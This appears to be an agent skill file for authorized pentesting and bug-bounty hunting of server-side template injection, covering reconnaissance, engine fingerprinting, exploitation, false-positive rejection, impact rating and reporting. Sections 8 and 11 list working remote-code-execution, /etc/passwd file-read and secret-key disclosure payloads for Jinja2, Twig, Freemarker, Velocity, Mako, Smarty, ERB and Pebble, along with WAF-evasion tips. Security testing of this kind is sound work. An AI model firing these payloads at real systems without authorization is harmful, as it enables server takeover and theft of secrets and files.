---
name: ssti
description: "Canonical Server-Side Template Injection (SSTI) capability: detection and exploitation across Jinja2, Twig, Freemarker, Velocity, Mako, Thymeleaf, Smarty, ERB, Pebble, and client-side template injection (CSTI). Covers arithmetic fingerprinting, engine identification, class-walker/RCE chains, length-constrained and CMS template-editor forms, automated tooling (tplmap, SSTImap), and reporting. Consolidates 2 sub-skills: exploiting-template-injection-vulnerabilities, hunt-ssti. Use when hunting or validating SSTI-related vulnerabilities."
sources: consolidated
report_count: 6
---

# SSTI — Canonical Capability

## 1. Identity and purpose

This is the single primary executable capability for Server-Side Template Injection (SSTI) testing across Jinja2, Twig, Freemarker, Velocity, Mako, Thymeleaf, Smarty, ERB, Pebble, and related engines, plus Client-Side Template Injection (CSTI). It consolidates 2 previously separate sub-skills into one operational entry point while preserving all source content in `references/` and the original sub-skill directories for rollback.

Primary objectives:
- Discover parameters, headers, error pages, email/PDF/report templates, and CMS template editors where user input reaches a server-side template engine.
- Fingerprint the template engine and escalate from arithmetic detection to remote code execution (RCE) or, when sandboxed, to XSS/SSRF.
- Handle length-constrained fields and authenticated CMS template-editor flows.
- Produce reproducible, impact-rated findings with remediation guidance.

## 2. Scope

In scope:
- Server-side template injection (SSTI) across Jinja2 (Python/Flask), Twig (PHP/Symfony), Freemarker (Java), Velocity (Java), Mako, Thymeleaf (Spring), Smarty (PHP), ERB (Ruby), EJS (Node.js), Pebble (Java), doT.js.
- Client-side template injection (CSTI) in AngularJS/Vue expressions.
- Arithmetic detection, engine fingerprinting, class-walker/RCE chains, secret/config disclosure, file read.
- Blind SSTI via OOB/DNS callbacks and time-based oracles.
- Automated testing with tplmap, SSTImap, Burp Suite, OWASP ZAP.
- Length-constrained injection fields and outbound-email sinks.
- CMS/documentation template-editor forms (authenticated).

Out of scope (hand off):
- Pure SQL injection on relational backends -> `sqli` capability.
- Server-side request forgery discovery (unless chained via template fetchers) -> `ssrf` capability.
- Command injection on the host outside template context -> `command-injection` capability.
- Cross-site scripting not via template evaluation -> `xss` capability.
- File upload handling (unless template is uploaded/re-rendered) -> `file-upload` capability.

## 3. Invocation and routing

Use this capability when:
- User input is reflected after template evaluation (e.g., `{{7*7}}` returns `49`).
- Error pages, profile fields, email/PDF/report generators, search results, or URL paths reflect input.
- CMS/marketing tools allow template customization or preview.
- Framework/stack fingerprints indicate Jinja2, Twig, Freemarker, Velocity, Thymeleaf, Smarty, ERB, EJS, Pebble, Mako.
- You are bug-bounty hunting or pentesting template-rendering features.

Routing notes:
- Start with `references/hunt-ssti.md` for hunting methodology, attack-surface signals, length-constrained and CMS flows, and chain tables.
- Use `references/exploiting-template-injection-vulnerabilities.md` for exploitation workflow, payloads, tools, and reporting templates.
- Use `references/api-reference.md` for the detection agent CLI and function reference.
- Chain to `hunt-rce` for OS command execution, `hunt-xss` when sandboxed, `hunt-ssrf` for template fetchers, `hunt-file-upload` for uploaded templates.

## 4. Inputs and outputs

Inputs:
- Target base URLs, endpoints, parameters, headers, and request templates.
- Session cookies / authentication material for credentialed tests (CMS editors).
- Sample request bodies (form-encoded vs JSON) and content types.
- Optional: Burp Suite project, browser automation, wordlists, OOB endpoint.

Outputs:
- Confirmed or refuted SSTI findings with request/response proof.
- Template engine identification and fingerprint evidence.
- RCE/XSS/SSRF/file-read proof or bounded impact statement.
- Length-constrained and CMS flow documentation.
- Reproduction steps, impact assessment, and remediation guidance.
- False-positive rulings with disproof rationale.

## 5. Preconditions and authorization

- Confirm written authorization and scope before testing; include RCE testing scope explicitly.
- Use only test accounts and non-production data unless explicitly authorized.
- Avoid destructive commands; prefer `id`, `whoami`, unique DNS callbacks, or read-only file access for proof.
- Do not access other users' data beyond proof of control.
- Document any out-of-scope endpoint discovered and hand off rather than exploit.
- Re-fetch CSRF tokens per request in authenticated flows; do not persist malicious templates unless authorized.

## 6. Reconnaissance

Recon steps:
1. Collect endpoints from OpenAPI/Swagger, Postman collections, JS bundles, source maps, mobile traffic, and proxy logs; grep for `template`, `render`, `preview`, `email`, `report`, `pdf`, `search`, `name`.
2. Probe API versions and paths: `/api/`, `/v1/`, `/v2/`, `/internal/`, `/admin/`, plus alternate content types.
3. Identify session/auth mechanisms and role/tenant boundaries; note CMS/editor roles.
4. Detect template-backed stacks: Flask/Django (Jinja2), Symfony (Twig), Spring (Thymeleaf), Rails (ERB), Java (Freemarker/Velocity/Pebble), PHP (Smarty), Node (EJS).
5. Harvest parameter names from JS/HTML forms; test both GET/POST and form-encoded vs JSON bodies.
6. Identify reflection contexts: HTML body, attributes, email bodies, PDFs, error pages, URL paths.
7. Fingerprint framework/gateway to select engine-specific references.

See `references/hunt-ssti.md` (Where to Test, CMS forms) and `references/exploiting-template-injection-vulnerabilities.md` (Step 1).

## 7. Detection methodology

Core detection flow:
1. Inject universal arithmetic payloads (`{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `{7*7}`, `*{7*7}`, `{{= 7*7}}`) and check for `49`.
2. Differentiate engines: `{{7*'7'}}` => `7777777` (Jinja2) vs `49` (Twig); `${.now}` (Freemarker); `{{config}}` (Flask/Jinja2).
3. Test both GET and POST; prefer form-encoded bodies for traditional forms.
4. Check arithmetic reflection inside HTML attributes (may be false negative); escalate to RCE payloads directly.
5. For authenticated CMS editors, fingerprint the full matrix before firing RCE; keep record id in query string.
6. Validate each candidate with a second independent request/account and mark refuted if not proven.
7. Blind SSTI: use time-based oracles (response-time delta vs baseline) and OOB/DNS callbacks; confirm with repeated samples.
8. Context-aware detection: compare against a baseline response and use word-boundary matching; never treat bare substring `49` as proof.

References by phase:
- Hunting: `references/hunt-ssti.md`.
- Exploitation: `references/exploiting-template-injection-vulnerabilities.md`.
- Automation: `references/api-reference.md`.

## 8. Technique selection

Select techniques by observed behavior:
- Jinja2/Flask -> `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`, class-walker variants, secret key disclosure.
- Twig/PHP -> `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`, `filter('system')`, file_excerpt.
- Freemarker/Java -> `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
- Velocity/Java -> `#set($e="e")$e.getClass().forName("java.lang.Runtime")...`.
- ERB/Ruby -> `<%= `id` %>`.
- Thymeleaf/Spring -> `*{7*7}` and Spring EL.
- Smarty/PHP -> `{system('id')}` / `{php}...{/php}`.
- Pebble/Java -> class/runtime exec.
- Mako/Python -> `${7*7}` arithmetic, `${__import__('os').popen('id').read()}` RCE.
- Blind SSTI -> time-based oracles and OOB callbacks when no reflection.
- Safe RCE validation -> harmless marker (`echo MARKER`) instead of destructive commands.
- EJS/Node -> `<%= 7*7 %>`.
- CSTI/AngularJS/Vue -> constructor-based XSS expressions.
- Length-constrained fields -> short probes + staged class enumeration; check outbound email sinks.
- CMS template editors -> fingerprint matrix, preview action, fresh CSRF, record id in query.

## 9. Execution steps

1. Establish a baseline request per endpoint (method, headers, body, auth) and record response.
2. Replay with one controlled change at a time (payload variants); record status, headers, body, timing.
3. Try Jinja2 RCE first on Python/Flask stacks; fall back to Twig, then arithmetic fingerprinting.
4. For traditional forms, send form-encoded bodies, not JSON.
5. Test length-constrained fields with short probes and staged enumeration; inspect email bodies.
6. For CMS editors, fingerprint engine, keep id in query, use preview for iteration, fresh CSRF.
7. Prove RCE via command output or OOB callback; prove XSS/SSRF/file-read per respective impact.
8. Confirm exploitability with a clean reproduction (request + response).
9. Stop and document when a vector is not exploitable or out of scope.

## 10. Tool usage

- Proxy: Burp Suite (Repeater, Intruder, Comparer, Logger++, Hackvertor).
- Scanners: tplmap, SSTImap, OWASP ZAP, Nuclei.
- Discovery: ffuf, httpx, KiteRunner, dirsearch.
- Automation: Python requests/httpx, curl, jq; detection agent `scripts/agent.py`.
- Evidence: saved requests/responses, timing captures, OOB callback logs.

See `references/exploiting-template-injection-vulnerabilities.md` (Tools & Systems), `references/hunt-ssti.md` (Phase 5), and `references/api-reference.md` (CLI usage).

## 11. Payloads and test cases

Representative test cases (adapt to target):
- Universal detection: `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `{7*7}`, `*{7*7}`, `{{= 7*7}}`, `#set($x=7*7)$x`.
- Engine differentiation: `{{7*'7'}}` => `7777777` (Jinja2) or `49` (Twig); `${.now}`; `{{config}}`.
- Jinja2 RCE: `{{cycler.__init__.__globals__.os.popen("id").read()}}`, `{{lipsum.__globals__["os"].popen("whoami").read()}}`, class-walker `{{"".__class__.__mro__[1].__subclasses__()[INDEX]("id",shell=True,stdout=-1).communicate()}}`.
- Jinja2 secret/file: `{{config.items()}}`, `{{config.SECRET_KEY}}`, `{{"".__class__.__mro__[1].__subclasses__()[40]("/etc/passwd").read()}}`.
- Twig RCE: `{{['id']|filter('system')}}`, `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`.
- Twig file read: `{{'/etc/passwd'|file_excerpt(1,30)}}`.
- Freemarker RCE: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
- Velocity RCE: `#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")`.
- ERB RCE: `<%= `id` %>`.
- Mako RCE: `${__import__('os').popen('id').read()}`.
- Blind SSTI: time-based payloads with delay; OOB callbacks.
- Safe validation: `{{cycler.__init__.__globals__.os.popen('echo MARKER').read()}}`.
- Smarty RCE: `{system('id')}`.
- Pebble RCE: `{% set cmd = 'id' %}{{['java.lang.Runtime']|first.getRuntime().exec(cmd)}}`.
- CSTI: `{{constructor.constructor('alert(1)')()}}`, `{{_c.constructor('alert(1)')()}}`.
- Length-constrained: `{{ '7'*7 }}`, `{{ [].__class__.__base__.__subclasses__() }}`.
- CMS/Freemarker docs: `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`.

Framework and variant details live in the corresponding references.

## 12. Evidence

Each finding must include:
- Exact request and response (raw HTTP or proxy capture).
- Template engine identified and fingerprint evidence.
- Authentication context and account/role used.
- Payload tested and observed behavior (command output, secret, file content, callback).
- Timing/callback evidence for blind SSTI.
- Impact assessment and affected scope.

## 13. Reproduction and validation

- Reproduce with a clean request (curl or Burp) against the target.
- Validate RCE via command output or OOB callback with a unique marker.
- Validate engine fingerprint with a second payload.
- Validate blind SSTI with consistent timing/callback and a known value.
- Validate length-constrained flows via the actual sink (e.g., email body).
- Mark as refuted if output does not change or engine is sandboxed without impact.

## 14. False-positive rejection

Reject or downgrade when:
- The endpoint echoes input without evaluation (no arithmetic result).
- Arithmetic reflection occurs inside a sandboxed engine with no escape.
- Response differences are due to caching, localization, or benign metadata.
- tplmap/SSTImap report detection but no command output is obtained.
- Client-side only evaluation (CSTI) is mislabeled as SSTI.
- Length-constrained probe fails to evaluate in any sink.
- CMS preview renders payload literally without evaluation.

## 15. Impact

Impact guidance:
- Critical: unauthenticated RCE via template injection; secret key disclosure enabling session forgery.
- High: authenticated RCE in CMS/editor; file read of sensitive files; stored XSS to all recipients via email templates.
- Medium: sandboxed SSTI yielding limited data disclosure or XSS; SSRF via template fetchers.
- Low: information disclosure or error-based fingerprinting without data access.
- Informational: defense/observation without exploitable impact.

Always tie impact to business risk and data scope; avoid severity inflation from arithmetic reflection alone. Apply the Pre-Severity Gate: `{{7*7}} -> 49` in a sandboxed engine is Medium, not Critical RCE.

## 16. Reporting

Report template:
- Summary: endpoint, vulnerability type, engine, payload, impact.
- Scope/authorization: test accounts.
- Steps to reproduce: numbered, minimal; include raw request and content type.
- Proof of concept: request/response, command output, callback, secret/file (redacted).
- Impact: business and data scope.
- Remediation: never render user input as template code; use logic-less engines (Mustache/Handlebars) where possible; sandboxed environments (Jinja2 SandboxedEnvironment) with no dangerous globals; strict input validation/allowlisting; least-privilege OS permissions; disable dangerous template features; patch template libraries.

## 17. Failure modes

- Surface not fully discovered -> expand recon, check mobile/SPA, versions, content types, email/PDF flows.
- No test account -> request credentials or scope clarification; do not bypass without authorization.
- WAF/gateway blocks payloads -> try encoding, Unicode escapes, `{%print(...)%}`, version downgrade, or parser differentials.
- Rate limiting stops testing -> coordinate throttling, use allowed test windows, or hand off.
- Engine not fingerprinted -> run full detection matrix; try all content types.
- Blind oracle noisy -> increase samples, use larger delay, or switch to OOB callback.
- Inconclusive authorization/origin result -> repeat with fresh sessions and diff responses; mark as not confirmed if ambiguous.

## 18. References

All 2 sub-skill references are preserved and must resolve:

| Reference | Sub-capability | Load when |
|---|---|---|
| `references/hunt-ssti.md` | `hunt-ssti` | Hunting methodology, attack-surface signals, length-constrained and CMS flows, chain tables |
| `references/exploiting-template-injection-vulnerabilities.md` | `exploiting-template-injection-vulnerabilities` | Exploitation workflow, payloads, tools, reporting |
| `references/api-reference.md` | detection agent | CLI usage and function reference for `scripts/agent.py` |

Original sub-skills remain intact under `exploiting-template-injection-vulnerabilities/` and `hunt-ssti/`.

## 19. Testing and mastery

- Validate with the capability tests in `tests/test_ssti_capability.py`.
- Confirm all referenced files resolve and are non-empty.
- Confirm migration map paths/hashes/status are accurate.
- Practice on authorized labs: PortSwigger SSTI labs, OWASP crAPI, HackTheBox.
- Mastery criteria: independently discover, fingerprint, prove, and report an SSTI finding (RCE or bounded impact) with full reproduction, impact, and remediation.


## Knowledge sources

- WKS bug classes: ssti
- Domain knowledge: ssti
- WKS remains the structured source of truth; retrieve and validate items through WKS rather than duplicating the full corpus in this skill.
- Research and learning material is mapped in `stage-a/knowledge-source-map.json` and must be validated before promotion.
